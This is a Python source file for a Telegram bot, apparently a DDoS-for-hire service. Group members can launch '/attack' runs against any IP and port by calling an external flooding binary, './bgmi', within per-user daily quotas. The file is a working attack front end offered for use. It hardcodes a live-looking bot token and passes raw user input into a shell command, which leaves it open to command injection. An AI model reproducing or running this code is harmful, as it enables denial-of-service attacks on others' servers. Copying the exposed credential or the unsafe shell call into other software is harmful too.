import os
import asyncio
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Suppress HTTP request logs from `python-telegram-bot`
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'  # Replace with your bot token
OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
ALLOWED_GROUP_ID = -1002491572572  # Replace with your allowed group ID
MAX_THREADS = 250  # Default maximum number of threads allowed per attack

# Attack & Feedback System
is_attack_running = False
attack_lock = asyncio.Lock()
max_duration = 120
daily_attack_limit = 8
user_attacks = {}
feedback_waiting = {}
attack_ban_list = {}  # Dictionary to track users banned from using the attack command

# Check if bot is used in the allowed group
def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID

# Start Command
async def start(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        return

    user_id = update.effective_user.id
    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <threads>*\n\n"
        f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
        "*💥 Let the war begin!*"
    )

    await update.message.reply_text(text=message, parse_mode='Markdown')

# Attack Command
async def attack(update: Update, context: CallbackContext):
    global is_attack_running

    if not is_allowed_group(update):
        return

    user_id = update.effective_user.id

    # Check if the user is banned from using the attack command
    if user_id in attack_ban_list:
        await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
        return

    if is_attack_running:
        await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
        return

    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    if user_attacks[user_id] <= 0:
        await update.message.reply_text("❌ *You have used all your daily attacks! Wait for reset or ask the owner to reset.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, threads = args
    duration = int(duration)
    threads = int(threads)

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return

    if threads > MAX_THREADS:
        await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
        return

    async with attack_lock:
        is_attack_running = True
        user_attacks[user_id] -= 1
        remaining_attacks = user_attacks[user_id]

        feedback_waiting[user_id] = True

        await update.message.reply_text(
            f"⚔️ *Attack Started!*\n"
            f"🎯 *Target*: {ip}:{port}\n"
            f"🕒 *Duration*: {duration} sec\n"
            f"🧵 *Threads*: {threads}\n"
            f"🔥 *Let the battlefield ignite! 💥*\n\n"
            f"💥 *You have {remaining_attacks} attacks left today!*\n\n"
            "📸 *Please send a photo feedback before the attack completes, or you will be banned from using the attack command for 10 minutes!*",
            parse_mode='Markdown'
        )

        asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context, user_id))

# Run Attack
async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
    global is_attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            await asyncio.wait_for(process.communicate(), timeout=duration + 10)
        except asyncio.TimeoutError:
            process.kill()
            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Attack process timed out!*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error during attack: {e}")
        await context.bot.send_message(chat_id=chat_id, text="❌ *An error occurred during the attack!*", parse_mode='Markdown')

    finally:
        is_attack_running = False

        if feedback_waiting.get(user_id):
            await context.bot.send_message(chat_id=chat_id, text=f"❌ *You didn't send feedback! You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')

            # Ban the user from using the attack command for 10 minutes
            attack_ban_list[user_id] = True
            asyncio.create_task(unban_user_after_delay(user_id, 600))  # 10 minutes = 600 seconds
        else:
            await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed! Thanks for your feedback!*", parse_mode='Markdown')

# Unban user after a delay
async def unban_user_after_delay(user_id, delay):
    await asyncio.sleep(delay)
    if user_id in attack_ban_list:
        del attack_ban_list[user_id]

# Handle Photo Feedback
async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')

# Reset User Attacks (Owner Only)
async def reset_attacks(update: Update, context: CallbackContext):
    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
        return

    for user_id in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")

# Set Max Threads (Owner Only)
async def set_threads(update: Update, context: CallbackContext):
    global MAX_THREADS

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can set the maximum threads!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ *Usage: /set_threads <max_threads>*", parse_mode='Markdown')
        return

    try:
        new_max_threads = int(args[0])
        if new_max_threads <= 0:
            await update.message.reply_text("❌ *Max threads must be a positive number!*", parse_mode='Markdown')
            return

        MAX_THREADS = new_max_threads
        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Max threads must be a number.*", parse_mode='Markdown')

# Main Bot Setup
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("resetattacks", reset_attacks))
    application.add_handler(CommandHandler("set_threads", set_threads))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    application.run_polling()

if __name__ == '__main__':
    main()
